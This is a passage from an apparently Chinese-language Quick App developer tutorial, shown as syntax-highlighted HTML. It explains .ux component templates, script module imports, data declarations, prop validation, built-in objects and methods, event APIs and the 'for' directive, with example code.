class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- temp.ux --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">import</span> <span class="attr">name</span>=<span class="string">"hint"</span> <span class="attr">src</span>=<span class="string">"./hint-modal"</span>&gt;</span><span class="tag">&lt;/<span class="name">import</span>&gt;</span>  <span class="comment">&lt;!-- 引入外部模板 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">import</span> <span class="attr">src</span>=<span class="string">"./table"</span>&gt;</span><span class="tag">&lt;/<span class="name">import</span>&gt;</span>  <span class="comment">&lt;!-- 引入外部模板 --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"mod-header"</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">text</span> <span class="attr">class</span>=<span class="string">"mod-title"</span> <span class="attr">style</span>=<span class="string">"color: red; margin: 10px;"</span>&gt;</span>&#123;&#123;title&#125;&#125;<span class="tag">&lt;/<span class="name">text</span>&gt;</span>    <span class="comment">&lt;!-- 行内样式 --&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">text</span> <span class="attr">class</span>=<span class="string">"mod-detail"</span> <span class="attr">onclick</span>=<span class="string">"showDetail"</span>&gt;</span>?<span class="tag">&lt;/<span class="name">text</span>&gt;</span>    <span class="comment">&lt;!-- 无参事件绑定 --&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"mod-content"</span>&gt;</span></span><br><span class="line">          <span class="comment">&lt;!-- block 用来表示逻辑，不渲染 --&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">block</span> <span class="attr">for</span>=<span class="string">"totalData"</span>&gt;</span>   <span class="comment">&lt;!-- for 循环遍历数组 $idx, $item 分别为数组的索引和值--&gt;</span></span><br><span class="line">              <span class="comment">&lt;!-- 事件绑定 --&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">div</span> <span class="attr">onclick</span>=<span class="string">"onTabClick($idx)"</span> <span class="attr">class</span>=<span class="string">"item &#123;&#123;tabIndex === $idx &amp;&amp; 'active'&#125;&#125;"</span>&gt;</span> <span class="comment">&lt;!-- 支持简单表达式 --&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">text</span> <span class="attr">class</span>=<span class="string">"&#123;&#123;tabIndex === $idx &amp;&amp; 'text-active'&#125;&#125;"</span>&gt;</span>&#123;&#123;($item || &#123;&#125;).name&#125;&#125;<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">text</span> <span class="attr">class</span>=<span class="string">"&#123;&#123;tabIndex === $idx &amp;&amp; 'text-active'&#125;&#125;"</span>&gt;</span>&#123;&#123;($item || &#123;&#125;).value&#125;&#125;<span class="tag">&lt;/<span class="name">text</span>&gt;</span>  <span class="comment">&lt;!-- 布尔值、null、undefined、'' 不渲染，其余包括 falsy 值一律渲染 --&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">block</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">image</span> <span class="attr">class</span>=<span class="string">"mod-like"</span> <span class="attr">if</span>=<span class="string">"&#123;&#123;isLike&#125;&#125;"</span> /&gt;</span> <span class="comment">&lt;!-- 支持if elif else, 必须是相邻节点 --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">image</span> <span class="attr">class</span>=<span class="string">"mod-dislike"</span> <span class="attr">else</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">table</span> <span class="attr">data</span>=<span class="string">&#123;&#123;dataList&#125;&#125;</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span>  <span class="comment">&lt;!-- 传入属性值，使用外部模板--&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">hint</span> <span class="attr">show</span>=<span class="string">"&#123;&#123;isHintShown&#125;&#125;"</span>&gt;</span></span><br><span class="line">          This is children of hint templete.</span><br><span class="line">      <span class="tag">&lt;/<span class="name">hint</span>&gt;</span>   <span class="comment">&lt;!-- 使用外部模板 --&gt;</span></span><br><span class="line">      <span class="comment">&lt;!-- if 和 show 的区别：if 为 false 分支的节点不会渲染进 DOM 树，而 show 为 false 的节点会渲染，只是 display: none; --&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">lang</span>=<span class="string">"less"</span> <span class="attr">src</span>=<span class="string">"./lessFile.less"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span>   <span class="comment">&lt;!-- 引入外部 CSS/LESS --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">lang</span>=<span class="string">"less"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="css">  <span class="comment">/* 引入外部 CSS/LESS */</span></span></span><br><span class="line"><span class="css">  @<span class="keyword">import</span> <span class="string">'../Common/global.less'</span>;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="css">  <span class="selector-class">.container</span>&#123;</span></span><br><span class="line"><span class="css">    <span class="comment">/* 定义样式，less 支持 */</span></span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">  <span class="keyword">import</span> fetch <span class="keyword">from</span> <span class="string">"@system.fetch"</span>    <span class="comment">// 引入系统 js</span></span></span><br><span class="line"><span class="javascript">  <span class="keyword">import</span> conf <span class="keyword">from</span> <span class="string">'./globalConf'</span>;     <span class="comment">// 引入外部 js</span></span></span><br><span class="line"><span class="undefined">  </span></span><br><span class="line"><span class="javascript">  <span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="javascript">    props: [<span class="string">'title'</span>, <span class="string">'dataList'</span>],  <span class="comment">// 传入属性：必须字母开头，全小写、数字和 `-` ，不能保留字和函数，不能以符号开头</span></span></span><br><span class="line"><span class="undefined">    public: &#123;</span></span><br><span class="line"><span class="javascript">      <span class="comment">// 定义变量，会被 props 和内部请求覆盖</span></span></span><br><span class="line"><span class="undefined">    &#125;,</span></span><br><span class="line"><span class="undefined">    private: &#123;</span></span><br><span class="line"><span class="javascript">      <span class="comment">// 定义变量，不会被 props 覆盖</span></span></span><br><span class="line"><span class="undefined">    &#125;,</span></span><br><span class="line"><span class="undefined">    protected: &#123;</span></span><br><span class="line"><span class="javascript">      <span class="comment">// 定义变量，不会被 props 覆盖, 但会被内部请求覆盖(获得通过 a 标签和 router 传递的参数)</span></span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="javascript">    data :&#123;   <span class="comment">// data 不能和 public、private、protected 一起使用，data 也可以是 function（返回 data 对象，onInit之前执行）</span></span></span><br><span class="line"><span class="javascript">      <span class="comment">// 定义变量：不能保留字和函数，不能以符号开头</span></span></span><br><span class="line"><span class="javascript">      totalData: [&#123;<span class="attr">name</span>: <span class="string">'a'</span>,<span class="attr">value</span>: <span class="number">97</span>&#125;,&#123;<span class="attr">name</span>: <span class="string">'b'</span>,<span class="attr">value</span>: <span class="number">98</span>&#125;];</span></span><br><span class="line"><span class="javascript">        <span class="comment">// 定义变量，会被 props 覆盖</span></span></span><br><span class="line"><span class="undefined">    &#125;,</span></span><br><span class="line"><span class="javascript">    onTabClick(index)&#123;    <span class="comment">// 内部事件定义</span></span></span><br><span class="line"><span class="javascript">      <span class="built_in">console</span>.log(index);</span></span><br><span class="line"><span class="undefined">    &#125;,</span></span><br><span class="line"><span class="undefined">    events: &#123;</span></span><br><span class="line"><span class="undefined">       onIDChange()&#123;</span></span><br><span class="line"><span class="javascript">          <span class="comment">// 外部事件定义</span></span></span><br><span class="line"><span class="undefined">       &#125;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- hint.ux --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">text</span>&gt;</span><span class="tag">&lt;<span class="name">slot</span>&gt;</span><span class="tag">&lt;/<span class="name">slot</span>&gt;</span><span class="tag">&lt;/<span class="name">text</span>&gt;</span>          <span class="comment">&lt;!-- slot: 获取该数据的引用的 children, 该例中即：This is children of hint templete. --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="2-7-script脚本"><a href="#2-7-script脚本" class="headerlink" title="2.7 script脚本"></a>2.7 script脚本</h2><h3 id="2-7-1-模块声明"><a href="#2-7-1-模块声明" class="headerlink" title="2.7.1 模块声明"></a>2.7.1 模块声明</h3><blockquote><p>可以通过<code>import</code>引入功能模块，在代码中调用模块方法</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import fetch from &quot;@system.fetch&quot;</span><br></pre></td></tr></table></figure><blockquote><p>也可以一次引入所有的模块，例如</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import system from &quot;@system&quot;</span><br></pre></td></tr></table></figure><ul><li>在代码中使用<code>system.network</code>来调用接口方法</li></ul><h3 id="2-7-2-对象"><a href="#2-7-2-对象" class="headerlink" title="2.7.2 对象"></a>2.7.2 对象</h3><h4 id="2-7-2-1-页面级组件"><a href="#2-7-2-1-页面级组件" class="headerlink" title="2.7.2.1 页面级组件"></a>2.7.2.1 页面级组件</h4><p><strong>data(废弃)</strong></p><ul><li>页面级组件的数据模型，能够转换为<code>JSON</code>对象</li><li>如果是函数，返回结果必须是对象，在组件初始化时会执行函数获取结果作为<code>data</code>的值</li><li>使用<code>data</code>方式声明的属性会被外部数据覆盖，因此存在一定安全风险，推荐使用下面的<code>public</code>,<code>protected</code>,<code>rivate</code>来声明属性（注意：它们不能与data同时声明）</li></ul><p><strong>public</strong></p><blockquote><p>页面级组件的数据模型，影响传入数据的覆盖机制：<code>public</code>内定义的属性允许被传入的数据覆盖，如果外部传入数据的某个属性未被声明，在<code>public</code>中不会新增这个属性</p></blockquote><p><strong>protected</strong></p><blockquote><p>页面级组件的数据模型，影响传入数据的覆盖机制：protected内定义的属性，允许被应用内部页面请求传递的数据覆盖，不允许被应用外部请求传递的数据覆盖</p></blockquote><p><strong>private</strong></p><blockquote><p>页面级组件的数据模型，影响传入数据的覆盖机制：private内定义的属性不允许被覆盖</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">   props: [<span class="string">'title'</span>, <span class="string">'dataList'</span>],  <span class="comment">// 传入属性：必须字母开头，全小写、数字和 `-` ，不能保留字和函数，不能以符号开头</span></span><br><span class="line">   public: &#123;</span><br><span class="line">     <span class="comment">// 定义变量，会被 props 和内部请求覆盖</span></span><br><span class="line">   &#125;,</span><br><span class="line">   private: &#123;</span><br><span class="line">     <span class="comment">// 定义变量，不会被 props 覆盖</span></span><br><span class="line">   &#125;,</span><br><span class="line">   protected: &#123;</span><br><span class="line">     <span class="comment">// 定义变量，不会被 props 覆盖, 但会被内部请求覆盖(获得通过 a 标签和 router 传递的参数)</span></span><br><span class="line">   &#125;</span><br><span class="line">   data :&#123;   <span class="comment">// data 不能和 public、private、protected 一起使用，data 也可以是 function（返回 data 对象，onInit之前执行）</span></span><br><span class="line">     <span class="comment">// 定义变量：不能保留字和函数，不能以符号开头</span></span><br><span class="line">     totalData: [&#123;<span class="attr">name</span>: <span class="string">'a'</span>,<span class="attr">value</span>: <span class="number">97</span>&#125;,&#123;<span class="attr">name</span>: <span class="string">'b'</span>,<span class="attr">value</span>: <span class="number">98</span>&#125;];</span><br><span class="line">       <span class="comment">// 定义变量，会被 props 覆盖</span></span><br><span class="line">   &#125;,</span><br><span class="line">   onTabClick(index)&#123;    <span class="comment">// 内部事件定义</span></span><br><span class="line">     <span class="built_in">console</span>.log(index);</span><br><span class="line">   &#125;,</span><br><span class="line">   events: &#123;</span><br><span class="line">      onIDChange()&#123;</span><br><span class="line">         <span class="comment">// 外部事件定义</span></span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h4 id="2-7-2-2-自定义组件"><a href="#2-7-2-2-自定义组件" class="headerlink" title="2.7.2.2 自定义组件"></a>2.7.2.2 自定义组件</h4><p><strong>data</strong></p><blockquote><p>自定义组件的数据模型，能够转换为JSON对象；属性名不能以$或_开头, 不要使用for, if, show, tid等保留字<br>如果是函数，返回结果必须是对象，在组件初始化时会执行函数获取结果作为data的值</p></blockquote><p><strong>props</strong></p><ul><li>定义组件外部可传入的所有属性</li><li>在模板代码中，请使用短横线分隔命名代替驼峰命名。如，属性定义<code>props: [&#39;propA&#39;]</code>，可通过<code>&lt;tag prop-a=&#39;xx&#39;&gt;</code>方式传递到组件内部</li></ul><p><strong>prop验证</strong></p><blockquote><p>在自定义组件中，可将props定义为带验证需求的对象。其中，key为属性名，value为属性对应的验证需求。验证失败则输出错误提示日志，增加prop验证有利于规范自定义组件的使用</p></blockquote><table><thead><tr><th>属性</th><th>类型</th><th>描述</th></tr></thead><tbody><tr><td><code>type</code></td><td>-</td><td>检查属性值的类型。支持单一类型和多种可能类型，可在原生和自定义构造函数中任意选择，单独或组合使用。原生构造函数：<code>String</code>  <code>Number</code>  <code>Boolean</code>  <code>Function</code>  <code>Object</code>  <code>Array</code>  <code>Symbol</code></td></tr><tr><td><code>default</code></td><td>-</td><td>设置属性的默认值</td></tr><tr><td><code>required</code></td><td><code>Boolean</code></td><td>设置属性是否必填</td></tr></tbody></table><p><code>validator</code>|    <code>Function</code>|    设置自定义验证函数。若函数的返回值为真，则通过验证；否则验证失败|</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">    props: &#123;</span><br><span class="line">      <span class="comment">// 单一类型检查的简写</span></span><br><span class="line">      propA: <span class="built_in">Number</span>,</span><br><span class="line">      <span class="comment">// 多种可能类型的简写</span></span><br><span class="line">      propB: [<span class="built_in">String</span>, <span class="built_in">Number</span>],</span><br><span class="line">      <span class="comment">// 必填的字符串</span></span><br><span class="line">      propC: &#123;</span><br><span class="line">        type: <span class="built_in">String</span>,</span><br><span class="line">        required: <span class="literal">true</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="comment">// 带默认值的数字</span></span><br><span class="line">      propD: &#123;</span><br><span class="line">        type: <span class="built_in">Number</span>,</span><br><span class="line">        <span class="keyword">default</span>: <span class="number">100</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="comment">// 带有默认值的对象</span></span><br><span class="line">      propE: &#123;</span><br><span class="line">        type: <span class="built_in">Object</span>,</span><br><span class="line">        <span class="keyword">default</span> () &#123;</span><br><span class="line">          <span class="keyword">return</span> &#123; <span class="attr">message</span>: <span class="string">'hello'</span> &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="comment">// 自定义验证函数</span></span><br><span class="line">      propF: &#123;</span><br><span class="line">        validator (value) &#123;</span><br><span class="line">          <span class="keyword">return</span> value === <span class="string">'hello'</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h4 id="2-7-2-3-公共对象"><a href="#2-7-2-3-公共对象" class="headerlink" title="2.7.2.3 公共对象"></a>2.7.2.3 公共对象</h4><table><thead><tr><th>属性</th><th>类型</th><th>描述</th></tr></thead><tbody><tr><td><code>$app</code></td><td><code>Object</code></td><td>应用对象</td></tr><tr><td><code>$page</code></td><td><code>Object</code></td><td>页面对象</td></tr><tr><td><code>$valid</code></td><td><code>Boolean</code></td><td>页面对象是否有效</td></tr><tr><td><code>$visible</code></td><td><code>Boolean</code></td><td>页面是否处于用户可见状态</td></tr></tbody></table><h4 id="2-7-2-4-应用对象"><a href="#2-7-2-4-应用对象" class="headerlink" title="2.7.2.4 应用对象"></a>2.7.2.4 应用对象</h4><blockquote><p>可通过<code>$app</code>访问</p></blockquote><table><thead><tr><th>属性</th><th>类型</th><th>描述</th></tr></thead><tbody><tr><td><code>$def</code></td><td><code>Object</code></td><td>使用<code>this.$app.$def</code>获取在<code>app.ux</code>中暴露的对象</td></tr><tr><td><code>$data</code></td><td><code>Object</code></td><td>使用<code>this.$app.$data</code>获取在<code>manifest.json</code>的<code>config.data</code>中声明的全局数据</td></tr></tbody></table><h4 id="2-7-2-5-页面对象"><a href="#2-7-2-5-页面对象" class="headerlink" title="2.7.2.5 页面对象"></a>2.7.2.5 页面对象</h4><blockquote><p>可通过<code>$page</code>访问</p></blockquote><table><thead><tr><th>属性</th><th>类型</th><th>描述</th></tr></thead><tbody><tr><td><code>actio</code>n</td><td><code>String</code></td><td>获取打开当前页面的<code>action</code>。仅在当前页面是通过<code>filter</code>匹配的方式打开时有效，否则为<code>undefined</code></td></tr><tr><td><code>uri</code></td><td><code>String</code></td><td>获取打开当前页面的uri。仅在当前页面是通过filter匹配的方式打开时有效，否则为<code>undefined</code></td></tr></tbody></table><h3 id="2-7-3-方法"><a href="#2-7-3-方法" class="headerlink" title="2.7.3 方法"></a>2.7.3 方法</h3><h4 id="2-7-3-1-数据方法"><a href="#2-7-3-1-数据方法" class="headerlink" title="2.7.3.1 数据方法"></a>2.7.3.1 数据方法</h4><table><thead><tr><th>属性</th><th>类型</th><th>参数</th><th>描述</th></tr></thead><tbody><tr><td><code>$set</code></td><td><code>Function</code></td><td><code>key: String value: Any</code></td><td>添加数据属性，用法<code>：this.$set(&#39;key&#39;,value)</code> <code>this.$vm(&#39;id&#39;).$set(&#39;key&#39;,value)</code></td></tr><tr><td><code>$delete</code></td><td><code>Function</code></td><td><code>key: String</code></td><td>删除数据属性，用法：<code>this.$delete(&#39;key&#39;)</code> <code>this.$vm(&#39;id&#39;).$delete(&#39;key&#39;)</code></td></tr></tbody></table><h4 id="2-7-3-2-公共方法"><a href="#2-7-3-2-公共方法" class="headerlink" title="2.7.3.2 公共方法"></a>2.7.3.2 公共方法</h4><table><thead><tr><th>属性</th><th>描述</th></tr></thead><tbody><tr><td><code>$element</code></td><td>获取指定<code>id</code>的组件<code>dom</code>对象，如果没有指定<code>id</code>，则返回根组件<code>dom</code>对象用法：<code>&lt;template&gt; &lt;div id=&#39;xxx&#39;&gt;&lt;/div&gt; &lt;/template&gt; this.$element(&#39;xxx&#39;)</code> 获取<code>id</code>为<code>xxx</code>的<code>div</code>组件实例对象 <code>this.$element()</code> 获取根组件实例对象</td></tr><tr><td><code>$root</code></td><td>获取顶层<code>ViewModel</code></td></tr><tr><td><code>$parent</code></td><td>获取父亲<code>ViewModel</code></td></tr><tr><td><code>$child</code></td><td>获取指定<code>id</code>的自定义组件的<code>ViewModel</code>用法：<code>this.$child(&#39;xxx&#39;)</code> 获取<code>id</code>为<code>xxx</code>的<code>div</code>组件<code>ViewModel</code></td></tr><tr><td><code>$vm deprecated</code></td><td>请使用上面<code>this.$child(&#39;xxx&#39;)</code>替代</td></tr><tr><td><code>$rootElement deprecated</code></td><td>请使用上面<code>this.$element()</code>替代</td></tr><tr><td><code>$forceUpdate</code></td><td>更新<code>ViewModel</code>数据，可能会触发<code>DOM</code>操作，如：创建节点、更新节点、删除节点等；这些DOM操作不一定在数据更新时立即执行，而是在开发者的业务代码执行后触发；若开发者期望数据更新时立即执行相应的<code>DOM</code>操作，可使用：<code>this.$forceUpdate()</code>；一般不推荐使用</td></tr></tbody></table><h4 id="2-7-3-3-事件方法"><a href="#2-7-3-3-事件方法" class="headerlink" title="2.7.3.3 事件方法"></a>2.7.3.3 事件方法</h4><table><thead><tr><th>属性</th><th>参数</th><th>描述</th></tr></thead><tbody><tr><td><code>$on</code></td><td><code>type: String</code> 事件名 <br><code>handler: Function</code>事件句柄函数</td><td>添加事件处理句柄用法：<code>this.$on(&#39;xxxx&#39;, this.fn)</code> <code>fn</code>是在<code>&lt;script&gt;</code>中定义的函数</td></tr><tr><td><code>$off</code></td><td><code>type: String</code> 事件名 <br><code>handler</code>:  事件句柄函数</td><td>删除事件处理句柄用法：<code>this.$off(&#39;xxxx&#39;, this.fn)</code> <code>this.$off(&#39;xxx&#39;)</code> 删除指定事件的所有处理句柄</td></tr><tr><td><code>$dispatch</code></td><td><code>type: String</code> 事件名</td><td>向上层组件发送事件通知用法：<code>this.$dispatch(&#39;xxx&#39;)</code>正常情况下，会一直向上传递事件（冒泡）如果要停止冒泡，在事件句柄函数中调用<code>evt.stop()</code>即可</td></tr><tr><td><code>$broadcast</code></td><td><code>type: String</code> 事件名</td><td>向子组件发送事件通知用法：<code>this.$broadcast(&#39;xxx&#39;)</code>正常情况下，会一直向下传递事件如果要停止传递，在事件句柄函数中调用<code>evt.stop()</code>即可</td></tr><tr><td><code>$emit</code></td><td><code>type: String</code> 事件名 <br><code>data: Object</code> 事件参数</td><td>触发事件，对应的句柄函数被调用用法：<code>this.$emit(&#39;xxx&#39;) this.$emit(&#39;xxx&#39;, {a:1})</code>传递的事件参数可在事件回调函数中，通过<code>evt.detail</code>来访问，例如<code>evt.detail.a</code></td></tr><tr><td><code>$emitElement</code></td><td><code>type: String</code> 事件名<br><code>data: Object</code> 事件参数 <br><code>id: String</code> 组件<code>id</code> (默认为<code>-1</code> 代表根元素)</td><td>触发组件事件,对应的句柄函数被调用用法：<code>this.$emitElement(&#39;xxx&#39;, null, &#39;id&#39;) this.$emitElement(&#39;xxx&#39;,{a:1})</code>传递的事件参数可在事件回调函数中，通过<code>evt.detail</code>来访问，例如<code>evt.detail.a</code></td></tr><tr><td><code>$watch</code></td><td><code>data: String</code> 属性名, 支持<code>&#39;a.b.c&#39;</code>格式，不支持数组索引 <br><code>handler: String</code> 事件句柄函数名,函数的第一个参数为新的属性值，第二个参数为旧的属性值</td><td>动态添加属性/事件绑定，属性必须在<code>data</code>中定义，<code>handler</code>函数必须在<code>&lt;script&gt;</code>定义；当属性值发生变化时事件才被触发用法：<code>this.$watch(&#39;a&#39;,&#39;handler&#39;)</code></td></tr></tbody></table><h4 id="2-7-3-4-应用方法"><a href="#2-7-3-4-应用方法" class="headerlink" title="2.7.3.4 应用方法"></a>2.7.3.4 应用方法</h4><blockquote><p>可通过$app访问</p></blockquote><table><thead><tr><th>属性</th><th>描述</th></tr></thead><tbody><tr><td>exit</td><td>退出快应用，结束应用生命周期。<br>调用方法：<code>this.$app.exit()</code></td></tr></tbody></table><h4 id="2-7-3-5-页面方法"><a href="#2-7-3-5-页面方法" class="headerlink" title="2.7.3.5 页面方法"></a>2.7.3.5 页面方法</h4><blockquote><p>可通过<code>$page</code>访问</p></blockquote><table><thead><tr><th>属性</th><th>参数</th><th>描述</th></tr></thead><tbody><tr><td><code>setTitleBar</code></td><td><code>text: String</code> 标题栏文字 <br><code>textColor: String</code> 文字颜色 <br><code>backgroundColor: String</code> 背景颜色 <br><code>backgroundOpacity : Number</code>背景透明度 <br><code>menu : Boolean</code> 是否在标题栏右上角显示菜单按钮</td><td>设置当前页面的标题栏用法：<code>this.$page.setTitleBar({text:&#39;Hello&#39;, textColor:&#39;#FF0000&#39;, backgroundColor:&#39;#FFFFFF&#39;, backgroundOpacity:0.5, menu: true})</code></td></tr><tr><td><code>finish</code></td><td>无</td><td>从本页面退出，结束页面生命周期。调用方法：<code>this.$page.finish()</code></td></tr></tbody></table><h2 id="2-8-指令"><a href="#2-8-指令" class="headerlink" title="2.8 指令"></a>2.8 指令</h2><p><strong>for</strong></p><blockquote><p><code>for</code>指令用于循环输出一个数组类型的数据</p></blockquote><ul><li>自定义变量表示<code>for</code>指令的数组索引和数组元素时，变量名不可以用<code>$</code>或<code>_</code>开头；</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"tutorial-page"</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 方式1：默认$item代表数组中的元素, $idx代表数组中的索引 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"tutorial-row"</span> <span class="attr">for</span>=<span class="string">"&#123;&#123;list&#125;&#125;"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">text</span>&gt;</span>&#123;&#123;$idx&#125;&#125;.&#123;&#123;$item.name&#125;&#125;<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 方式2：自定义元素变量名称 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"tutorial-row"</span> <span class="attr">for</span>=<span class="string">"value in list"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">text</span>&gt;</span>&#123;&#123;$idx&#125;&#125;.&#123;&#123;value.name&#125;&#125;<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 方式3：自定义元素、索引的变量名称 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"tutorial-row"</span> <span class="attr">for</span>=<span class="string">"(personIndex, personItem) in list"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">text</span>&gt;</span>&#123;&#123;personIndex&#125;&#125;.&#123;&#123;personItem.name&#125;&#125;<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span 